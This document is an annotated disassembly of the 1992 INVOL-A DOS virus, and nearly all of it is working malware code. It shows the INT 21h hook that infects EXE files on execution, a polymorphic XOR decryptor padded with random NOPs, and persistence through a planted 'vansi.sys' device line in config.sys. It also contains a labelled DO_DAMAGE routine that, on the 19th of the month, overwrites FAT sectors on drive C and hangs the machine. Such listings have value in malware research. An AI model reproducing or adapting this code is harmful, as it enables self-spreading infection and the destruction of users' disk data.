; INVOL-A INT 21h handler   Aug 26, 1992
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

0b59:0014      3d 00 4b            cmp            ax,4b00
0b59:0017      74 03               jz             001c
0b59:0019      e9 7b 02            jmp            ORIGINAL_21h (0297)

0b59:001c      50                  push           ax
0b59:001d      53                  push           bx
0b59:001e      52                  push           dx
0b59:001f      1e                  push           ds
0b59:0020      06                  push           es
0b59:0021      b8 02 3d            mov            ax,3d02
0b59:0024      cd 21               int            21
0b59:0026      73 03               jae            002b
0b59:0028      e9 67 02            jmp            0292
0b59:002b      8b d8               mov            bx,ax
0b59:002d      8c c8               mov            ax,cs
0b59:002f      8e d8               mov            ds,ax
0b59:0031      b4 3f               mov            ah,3f
0b59:0033      b9 18 00            mov            cx,0018
0b59:0036      ba 70 05            mov            dx,0570
0b59:0039      cd 21               int            21
0b59:003b      72 4d               jb             008a
0b59:003d      81 3e 70 05 4d
               5a                  cmp       word [0570],5a4d
0b59:0043      75 45               jnz            008a
0b59:0045      b4 00               mov            ah,00
0b59:0047      cd 1a               int            1a
0b59:0049      89 16 9d 02         mov            [029d],dx
0b59:004d      b8 02 42            mov            ax,4202
0b59:0050      b9 00 00            mov            cx,0000
0b59:0053      ba 00 00            mov            dx,0000
0b59:0056      cd 21               int            21
0b59:0058      72 30               jb             008a
0b59:005a      89 16 6c 05         mov            [056c],dx
0b59:005e      a3 6e 05            mov            [056e],ax
0b59:0061      2d 02 00            sub            ax,0002
0b59:0064      83 da 00            sbb            dx,00
0b59:0067      8b ca               mov            cx,dx
0b59:0069      8b d0               mov            dx,ax
0b59:006b      b8 00 42            mov            ax,4200
0b59:006e      cd 21               int            21
0b59:0070      72 18               jb             008a
0b59:0072      b9 02 00            mov            cx,0002
0b59:0075      ba 88 05            mov            dx,0588
0b59:0078      b4 3f               mov            ah,3f
0b59:007a      cd 21               int            21
0b59:007c      72 0c               jb             008a
0b59:007e      a1 82 05            mov            ax,[0582]
0b59:0081      33 06 88 05         xor            ax,[0588]
0b59:0085      3d 4a 4c            cmp            ax,4c4a
0b59:0088      75 03               jnz            008d
0b59:008a      e9 01 02            jmp            028e
0b59:008d      b4 2a               mov            ah,2a
0b59:008f      cd 21               int            21
0b59:0091      80 fa 13            cmp            dl,13
0b59:0094      74 03               jz             DO_DAMAGE (0099)
0b59:0096      e9 b7 00            jmp            0150
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
DO_DAMAGE:
                                                           
; first display the message below

0b59:0099      b8 02 00            mov            ax,0002
0b59:009c      cd 10               int            10
0b59:009e      ba b1 00            mov            dx,00b1
0b59:00a1      b4 09               mov            ah,09
0b59:00a3      cd 21               int            21

; then overwrite the first 10 sectors of FAT-1 on C: drive

0b59:00a5      b0 02               mov            al,02
0b59:00a7      b9 0a 00            mov            cx,000a
0b59:00aa      ba 01 00            mov            dx,0001
0b59:00ad      cd 26               int            26

; Hang the machine

0b59:00af      eb fe               jmp            00af
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
0b59:00b1      59 6f 75 20 68 61 76 65 |You have|
0b59:00b9      20 68 65 6c 70 65 64 20 | helped |
0b59:00c1      73 70 72 65 61 64 20 74 |spread t|
0b59:00c9      68 69 73 20 76 69 72 75 |his viru|
0b59:00d1      73 2e 0d 0a 54 68 69 73 |s...This|
0b59:00d9      20 68 61 73 20 62 65 65 | has bee|
0b59:00e1      6e 20 61 20 6d 65 73 73 |n a mess|
0b59:00e9      61 67 65 20 66 72 6f 6d |age from|
0b59:00f1      20 79 6f 75 72 20 66 72 | your fr|
0b59:00f9      69 65 6e 64 6c 79 0d 0a |iendly..|
0b59:0101      6e 65 69 67 68 62 6f 72 |neighbor|
0b59:0109      68 6f 6f 64 20 69 6e 66 |hood inf|
0b59:0111      65 63 74 69 6f 6e 20 73 |ection s|
0b59:0119      65 72 76 69 63 65 2e 0d |ervice..|
0b59:0121      0a 54 68 61 6e 6b 20 79 |.Thank y|
0b59:0129      6f 75 20 66 6f 72 20 79 |ou for y|
0b59:0131      6f 75 72 20 69 6e 76 6f |our invo|
0b59:0139      6c 75 6e 74 61 72 79 20 |luntary |
0b59:0141      63 6f 6f 70 65 72 61 74 |cooperat|
0b59:0149      69 6f 6e 2e 0d 0a 24 |ion...$|
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
0b59:0150      a1 6e 05            mov            ax,[056e]
0b59:0153      25 0f 00            and            ax,000f
0b59:0156      75 0a               jnz            0162
0b59:0158      8b 16 6c 05         mov            dx,[056c]
0b59:015c      a1 6e 05            mov            ax,[056e]
0b59:015f      eb 1d               jmp            017e
0b59:0161      90                  nop

0b59:0162      b2 10               mov            dl,10
0b59:0164      2a d0               sub            dl,al
0b59:0166      b6 00               mov            dh,00
0b59:0168      01 16 6e 05         add            [056e],dx
0b59:016c      83 16 6c 05 00      adc       word [056c],00
0b59:0171      b9 00 00            mov            cx,0000
0b59:0174      b8 02 42            mov            ax,4202
0b59:0177      cd 21               int            21
0b59:0179      73 03               jae            017e
0b59:017b      e9 10 01            jmp            028e

0b59:017e      b9 04 00            mov            cx,0004

0b59:0181      d1 ea               shr            dx,1
0b59:0183      d1 d8               rcr            ax,1
0b59:0185      e2 fa               loop           0181

0b59:0187      2b 06 78 05         sub            ax,[0578]
0b59:018b      01 06 7a 05         add            [057a],ax
0b59:018f      8b 16 86 05         mov            dx,[0586]
0b59:0193      89 16 a6 04         mov            [04a6],dx
0b59:0197      8b 16 84 05         mov            dx,[0584]
0b59:019b      89 16 a4 04         mov            [04a4],dx
0b59:019f      8b 16 7e 05         mov            dx,[057e]
0b59:01a3      89 16 9b 04         mov            [049b],dx
0b59:01a7      8b 16 80 05         mov            dx,[0580]
0b59:01ab      89 16 a0 04         mov            [04a0],dx
0b59:01af      a3 86 05            mov            [0586],ax
0b59:01b2      c7 06 84 05 58 05   mov       word [0584],0558
0b59:01b8      05 5f 00            add            ax,005f
0b59:01bb      a3 7e 05            mov            [057e],ax
0b59:01be      c7 06 80 05 00 01   mov       word [0580],0100
0b59:01c4      a1 9d 02            mov            ax,[029d]
0b59:01c7      a3 82 05            mov            [0582],ax
0b59:01ca      be 14 00            mov            si,0014
0b59:01cd      8c df               mov            di,ds
0b59:01cf      8e c7               mov            es,di
0b59:01d1      bf 88 05            mov            di,0588
0b59:01d4      b9 ac 02            mov            cx,02ac
0b59:01d7      8b 16 9d 02         mov            dx,[029d]

0b59:01db      fc                  cld
0b59:01dc      ad                  lodsw
0b59:01dd      33 c2               xor            ax,dx
0b59:01df      ab                  stosw
0b59:01e0      e2 fa               loop           01dc

0b59:01e2      be 9c 02            mov            si,029c
0b59:01e5      d1 ea               shr            dx,1
0b59:01e7      73 04               jae            01ed
0b59:01e9      c6 05 90            mov       byte [di],90
0b59:01ec      47                  inc            di
0b59:01ed      a5                  movs
0b59:01ee      a5                  movs
0b59:01ef      a5                  movs
0b59:01f0      b9 0a 00            mov            cx,000a
0b59:01f3      83 f9 03            cmp            cx,03
0b59:01f6      75 02               jnz            01fa
0b59:01f8      8b ef               mov            bp,di
0b59:01fa      d1 ea               shr            dx,1
0b59:01fc      73 04               jae            0202
0b59:01fe      c6 05 90            mov       byte [di],90
0b59:0201      47                  inc            di
0b59:0202      a5                  movsw
0b59:0203      e2 ee               loop           01f3
0b59:0205      b0 e2               mov            al,e2
0b59:0207      aa                  stosb
0b59:0208      2b ef               sub            bp,di
0b59:020a      4d                  dec            bp
0b59:020b      8b c5               mov            ax,bp
0b59:020d      aa                  stosb
0b59:020e      b0 e9               mov            al,e9
0b59:0210      aa                  stosb
0b59:0211      b8 a0 02            mov            ax,02a0
0b59:0214      2b c7               sub            ax,di
0b59:0216      05 88 05            add            ax,0588
0b59:0219      ab                  stosw
0b59:021a      b8 4a 4c            mov            ax,4c4a
0b59:021d      33 06 9d 02         xor            ax,[029d]
0b59:0221      89 05               mov            [di],ax
0b59:0223      83 c7 02            add            di,02
0b59:0226      81 ef 88 05         sub            di,0588
0b59:022a      8b cf               mov            cx,di
0b59:022c      ba 88 05            mov            dx,0588
0b59:022f      b4 40               mov            ah,40
0b59:0231      cd 21               int            21
0b59:0233      72 59               jb             028e
0b59:0235      01 06 6e 05         add            [056e],ax
0b59:0239      83 16 6c 05 00      adc       word [056c],00
0b59:023e      8b 16 6c 05         mov            dx,[056c]
0b59:0242      a1 6e 05            mov            ax,[056e]
0b59:0245      8a f2               mov            dh,dl
0b59:0247      8a d4               mov            dl,ah
0b59:0249      d1 ea               shr            dx,1
0b59:024b      b4 00               mov            ah,00
0b59:024d      d0 d4               rcl            ah,1
0b59:024f      42                  inc            dx
0b59:0250      89 16 74 05         mov            [0574],dx
0b59:0254      a3 72 05            mov            [0572],ax
0b59:0257      8b 16 6c 05         mov            dx,[056c]
0b59:025b      a1 6e 05            mov            ax,[056e]
0b59:025e      b9 04 00            mov            cx,0004

0b59:0261      d1 ea               shr            dx,1
0b59:0263      d1 d8               rcr            ax,1
0b59:0265      e2 fa               loop           0261

0b59:0267      2b 06 78 05         sub            ax,[0578]
0b59:026b      29 06 7a 05         sub            [057a],ax
0b59:026f      73 06               jae            0277
0b59:0271      c7 06 7a 05 00 00   mov       word [057a],0000
0b59:0277      b9 00 00            mov            cx,0000
0b59:027a      ba 00 00            mov            dx,0000
0b59:027d      b8 00 42            mov            ax,4200
0b59:0280      cd 21               int            21
0b59:0282      72 0a               jb             028e
0b59:0284      b9 18 00            mov            cx,0018
0b59:0287      ba 70 05            mov            dx,0570
0b59:028a      b4 40               mov            ah,40
0b59:028c      cd 21               int            21

0b59:028e      b4 3e               mov            ah,3e
0b59:0290      cd 21               int            21
0b59:0292      07                  pop            es
0b59:0293      1f                  pop            ds
0b59:0294      5a                  pop            dx
0b59:0295      5b                  pop            bx
0b59:0296      58                  pop            ax

ORIGINAL_21h:

0b59:0297      ea eb 40 19 00      jmp            0019:40eb

0b59:029c      ba c4 68            mov            dx,68c4
0b59:029f      b9 ac 02            mov            cx,02ac
0b59:02a2      8c dd               mov            bp,ds
0b59:02a4      8c c8               mov            ax,cs
0b59:02a6      8e d8               mov            ds,ax
0b59:02a8      8e c0               mov            es,ax
0b59:02aa      33 f6               xor            si,si
0b59:02ac      8b fe               mov            di,si

0b59:02ae      fc                  cld
0b59:02af      90                  nop
0b59:02b0      ad                  lodsw
0b59:02b1      90                  nop
0b59:02b2      33 c2               xor            ax,dx
0b59:02b4      ab                  stosw
0b59:02b5      90                  nop
0b59:02b6      8e dd               mov            ds,bp
0b59:02b8      be 80 00            mov            si,0080
0b59:02bb      bf 66 05            mov            di,0566
0b59:02be      b9 40 00            mov            cx,0040
0b59:02c1      f3                  repz
0b59:02c2      a5                  movsw
0b59:02c3      8c c0               mov            ax,es
0b59:02c5      8e d8               mov            ds,ax
0b59:02c7      8b c5               mov            ax,bp
0b59:02c9      05 10 00            add            ax,0010
0b59:02cc      01 06 92 04         add            [0492],ax
0b59:02d0      01 06 87 04         add            [0487],ax

; Hook INT 21h

0b59:02d4      b8 00 00            mov            ax,0000
0b59:02d7      8e d8               mov            ds,ax
0b59:02d9      c4 1e 84 00         les            bx,[0084]
0b59:02dd      81 fb b6 0c         cmp            bx,0cb6
0b59:02e1      75 14               jnz            02f7
0b59:02e3      26 80 3f 9c         cmp       byte es:[bx],9c
0b59:02e7      75 0e               jnz            02f7
0b59:02e9      26 c4 06 c5 02      les            ax,es:[02c5]
0b59:02ee      fa                  cli
0b59:02ef      a3 84 00            mov            [0084],ax
0b59:02f2      8c 06 86 00         mov            [0086],es
0b59:02f6      fb                  sti

0b59:02f7      8c c8               mov            ax,cs
0b59:02f9      8e d8               mov            ds,ax
0b59:02fb      8e c0               mov            es,ax
0b59:02fd      b8 00 3d            mov            ax,3d00
0b59:0300      ba 94 04            mov            dx,0494
0b59:0303      cd 21               int            21
0b59:0305      72 79               jb             0380
0b59:0307      8b d8               mov            bx,ax
0b59:0309      ba f0 06            mov            dx,06f0
0b59:030c      b9 00 04            mov            cx,0400
0b59:030f      b4 3f               mov            ah,3f
0b59:0311      cd 21               int            21
0b59:0313      72 6e               jb             0383
0b59:0315      8b c8               mov            cx,ax
0b59:0317      a3 78 05            mov            [0578],ax
0b59:031a      be f0 06            mov            si,06f0


0b59:031d      ac                  lodsb
0b59:031e      3c 44               cmp            al,44       ; 'D'
0b59:0320      74 06               jz             0328
0b59:0322      3c 64               cmp            al,64       ; 'd'
0b59:0324      e0 f7               loopnz         031d

0b59:0326      e3 5e               jcxz           0386

0b59:0328      bf a2 04            mov            di,04a2

0b59:032b      ac                  lodsb
0b59:032c      3c 61               cmp            al,61       ; 'a'
0b59:032e      72 02               jb             0332
0b59:0330      2c 20               sub            al,20
0b59:0332      ae                  scasb
0b59:0333      e1 f6               loopz          032b
0b59:0335      e3 4f               jcxz           0386

0b59:0337      81 ff a8 04         cmp            di,04a8
0b59:033b      e0 e0               loopnz         031d
0b59:033d      8b fe               mov            di,si
0b59:033f      4f                  dec            di
0b59:0340      b0 3d               mov            al,3d
0b59:0342      f2                  repnz
0b59:0343      ae                  scasb
0b59:0344      b0 41               mov            al,41
0b59:0346      ae                  scasb
0b59:0347      77 fd               ja             0346
0b59:0349      8b f7               mov            si,di
0b59:034b      b0 20               mov            al,20
0b59:034d      ae                  scasb
0b59:034e      72 fd               jb             034d
0b59:0350      c6 45 ff 00         mov       byte [-01+di],00
0b59:0354      8b fe               mov            di,si
0b59:0356      83 ef 04            sub            di,04
0b59:0359      80 3c 3a            cmp       byte [si],3a   ; ':'
0b59:035c      74 04               jz             0362
0b59:035e      4e                  dec            si
0b59:035f      eb 05               jmp            0366
0b59:0361      90                  nop

0b59:0362      83 c7 02            add            di,02
0b59:0365      46                  inc            si
0b59:0366      80 3c 5c            cmp       byte [si],5c  ; '\'
0b59:0369      75 01               jnz            036c
0b59:036b      47                  inc            di

0b59:036c      8b d7               mov            dx,di
0b59:036e      be a8 04            mov            si,04a8
0b59:0371      b9 03 00            mov            cx,0003
0b59:0374      f3                  repz
0b59:0375      a4                  movsb
0b59:0376      b8 02 3d            mov            ax,3d02
0b59:0379      cd 21               int            21
0b59:037b      72 09               jb             0386
0b59:037d      e9 92 00            jmp            0412
0b59:0380      e9 07 01            jmp            048a
0b59:0383      e9 00 01            jmp            0486

0b59:0386      b4 3e               mov            ah,3e
0b59:0388      cd 21               int            21
0b59:038a      72 f4               jb             0380
0b59:038c      b8 02 3d            mov            ax,3d02
0b59:038f      cd 21               int            21
0b59:0391      72 ed               jb             0380
0b59:0393      8b d8               mov            bx,ax
0b59:0395      b4 3f               mov            ah,3f
0b59:0397      b9 ff ff            mov            cx,ffff
0b59:039a      ba 02 07            mov            dx,0702
0b59:039d      cd 21               int            21
0b59:039f      72 e2               jb             0383
0b59:03a1      bf f0 06            mov            di,06f0
0b59:03a4      be b5 04            mov            si,04b5
0b59:03a7      b9 12 00            mov            cx,0012
0b59:03aa      f3                  repz
0b59:03ab      a4                  movsb
0b59:03ac      b8 00 42            mov            ax,4200
0b59:03af      b9 00 00            mov            cx,0000
0b59:03b2      ba 00 00            mov            dx,0000
0b59:03b5      cd 21               int            21
0b59:03b7      72 ca               jb             0383
0b59:03b9      8b 0e 78 05         mov            cx,[0578]
0b59:03bd      83 c1 12            add            cx,12
0b59:03c0      90                  nop
0b59:03c1      ba f0 06            mov            dx,06f0
0b59:03c4      b4 40               mov            ah,40
0b59:03c6      cd 21               int            21
0b59:03c8      72 b9               jb             0383
0b59:03ca      b4 3e               mov            ah,3e
0b59:03cc      cd 21               int            21
0b59:03ce      72 b0               jb             0380
0b59:03d0      b8 13 80            mov            ax,8013
0b59:03d3      a3 52 05            mov            [0552],ax
0b59:03d6      b8 14 00            mov            ax,0014
0b59:03d9      a3 ff 04            mov            [04ff],ax
0b59:03dc      b8 23 00            mov            ax,0023
0b59:03df      a3 04 05            mov            [0504],ax
0b59:03e2      b9 04 00            mov            cx,0004
0b59:03e5      be c8 04            mov            si,04c8
0b59:03e8      bf 58 05            mov            di,0558
0b59:03eb      f3                  repz
0b59:03ec      a5                  movs
0b59:03ed      be d0 04            mov            si,04d0
0b59:03f0      bf 04 07            mov            di,0704
0b59:03f3      b9 21 00            mov            cx,0021
0b59:03f6      f3                  repz
0b59:03f7      a5                  movs
0b59:03f8      b4 3c               mov            ah,3c
0b59:03fa      b9 02 00            mov            cx,0002
0b59:03fd      ba a8 04            mov            dx,04a8
0b59:0400      cd 21               int            21
0b59:0402      73 03               jae            0407
0b59:0404      e9 83 00            jmp            048a
0b59:0407      8b d8               mov            bx,ax
0b59:0409      c7 06 62 05 42   
               00                  mov       word [0562],0042
0b59:040f      eb 4c               jmp            045d
0b59:0411      90                  nop
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
0b59:0412      8b c8               mov            cx,ax
0b59:0414      b4 3e               mov            ah,3e
0b59:0416      cd 21               int            21
0b59:0418      8b d9               mov            bx,cx
0b59:041a      72 6a               jb             0486
0b59:041c      ba f0 06            mov            dx,06f0
0b59:041f      b9 ff ff            mov            cx,ffff
0b59:0422      b4 3f               mov            ah,3f
0b59:0424      cd 21               int            21
0b59:0426      72 5e               jb             0486
0b59:0428      a3 62 05            mov            [0562],ax
0b59:042b      a1 02 07            mov            ax,[0702]
0b59:042e      3d 4a 4c            cmp            ax,4c4a
0b59:0431      74 53               jz             0486
0b59:0433      a1 f6 06            mov            ax,[06f6]
0b59:0436      a3 ff 04            mov            [04ff],ax
0b59:0439      a1 f8 06            mov            ax,[06f8]
0b59:043c      a3 04 05            mov            [0504],ax
0b59:043f      a1 f4 06            mov            ax,[06f4]
0b59:0442      a3 52 05            mov            [0552],ax
0b59:0445      b9 04 00            mov            cx,0004
0b59:0448      be fa 06            mov            si,06fa
0b59:044b      bf 58 05            mov            di,0558
0b59:044e      f3                  repz
0b59:044f      a5                  movs
0b59:0450      b9 00 00            mov            cx,0000
0b59:0453      ba 00 00            mov            dx,0000
0b59:0456      b8 00 42            mov            ax,4200
0b59:0459      cd 21               int            21
0b59:045b      72 29               jb             0486
0b59:045d      c7 06 60 05 4a 4c   mov       word [0560],4c4a
0b59:0463      b9 14 00            mov            cx,0014
0b59:0466      ba 4e 05            mov            dx,054e
0b59:0469      b4 40               mov            ah,40
0b59:046b      cd 21               int            21
0b59:046d      72 17               jb             0486
0b59:046f      ba 00 00            mov            dx,0000
0b59:0472      b9 fc 0a            mov            cx,0afc
0b59:0475      b4 40               mov            ah,40
0b59:0477      cd 21               int            21
0b59:0479      72 0b               jb             0486
0b59:047b      8b 0e 62 05         mov            cx,[0562]
0b59:047f      ba f0 06            mov            dx,06f0
0b59:0482      b4 40               mov            ah,40
0b59:0484      cd 21               int            21
0b59:0486      b4 3e               mov            ah,3e
0b59:0488      cd 21               int            21

0b59:048a      8e c5               mov            es,bp
0b59:048c      bf 80 00            mov            di,0080
0b59:048f      be 66 05            mov            si,0566
0b59:0492      b9 40 00            mov            cx,0040
0b59:0495      f3                  repz
0b59:0496      a5                  movs
0b59:0497      8e dd               mov            ds,bp
0b59:0499      fa                  cli
0b59:049a      b8 a0 0d            mov            ax,0da0
0b59:049d      8e d0               mov            ss,ax
0b59:049f      bc 10 bf            mov            sp,bf10
0b59:04a2      fb                  sti
0b59:04a3      ea 00 00 00 00      jmp            0000:0000

0b59:04a8      63 3a 5c 63 6f 6e 66 69 |c:\confi|
0b59:04b0      67 2e 73 79 73 00 45 56 |g.sys.EV|
0b59:04b8      49 43 45 00 43 3a 5c 76 |ICE.C:\v|
0b59:04c0      61 6e 73 69 2e 73 79 73 |ansi.sys|
0b59:04c8      00 64 65 76 69 63 65 3d |.device=|
0b59:04d0      76 61 6e 73 69 2e 73 79 |vansi.sy|
0b59:04d8      73 0d 0a 90 76 61 6e 73 |s...vans|
0b59:04e0      69 20 20 20 |i   |
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
STRAT:

0b59:04e4      2e 89 1e 1f 00      mov            cs:[001f],bx
0b59:04e9      2e 8c 06 21 00      mov            cs:[0021],es
0b59:04ee      cb                  retf

0b59:04ef      00 00               add            [bx+si],al
0b59:04f1      00 00               add            [bx+si],al

0b59:04f3      53                  push           bx
0b59:04f4      06                  push           es
0b59:04f5      2e 8b 1e 1f 00      mov            bx,cs:[001f]
0b59:04fa      2e 8e 06 21 00      mov            es,cs:[0021]
0b59:04ff      26 c7 47 03 00 00   mov       word es:[03+bx],0000
0b59:0505      26 c7 47 0e 42 00   mov       word es:[0e+bx],0042
0b59:050b      26 8c 4f 10         mov            es:[10+bx],cs
0b59:050f      07                  pop            es
0b59:0510      5b                  pop            bx
0b59:0511      cb                  retf

0b59:0512      ea c1 00 0a 0c      jmp            0c0a:00c1
0b59:0517      ea cc 00 0a 0c      jmp            0c0a:00cc

0b59:051c      50                  push           ax
0b59:051d      8c c8               mov            ax,cs
0b59:051f      05 b1 00            add            ax,00b1
0b59:0522      2e a3 15 05         mov            cs:[0515],ax
0b59:0526      2e a3 1a 05         mov            cs:[051a],ax
0b59:052a      b8 12 05            mov            ax,0512
0b59:052d      2e a3 06 00         mov            cs:[0006],ax
0b59:0531      58                  pop            ax
0b59:0532      eb de               jmp            0512

0b59:0534      50                  push           ax
0b59:0535      53                  push           bx
0b59:0536      1e                  push           ds
0b59:0537      fa                  cli
0b59:0538      b8 00 00            mov            ax,0000
0b59:053b      8e d8               mov            ds,ax
0b59:053d      bb 84 00            mov            bx,0084
0b59:0540      8b 07               mov            ax,[bx]
0b59:0542      2e a3 98 02         mov            cs:[0298],ax
0b59:0546      8b 47 02            mov            ax,[02+bx]
0b59:0549      2e a3 9a 02         mov            cs:[029a],ax
0b59:054d      b8 14 00            mov            ax,0014
0b59:0550      89 07               mov            [bx],ax
0b59:0552      8c 4f 02            mov            [02+bx],cs
0b59:0555      b8 17 05            mov            ax,0517
0b59:0558      2e a3 08 00         mov            cs:[0008],ax
0b59:055c      fb                  sti
0b59:055d      1f                  pop            ds
0b59:055e      5b                  pop            bx
0b59:055f      58                  pop            ax
0b59:0560      eb b5               jmp            0517

DEV_HDR:

0b59:0562      ff                  ????
0b59:0563      ff                  ????
0b59:0564      ff                  ????
0b59:0565      ff 
               53 c0
0b59:0568      1c 05          
0b59:056a      34 05
0b59:056c      01 00
0b59:056e      7c 2d
0b59:0570      4d
0b59:0571      5a
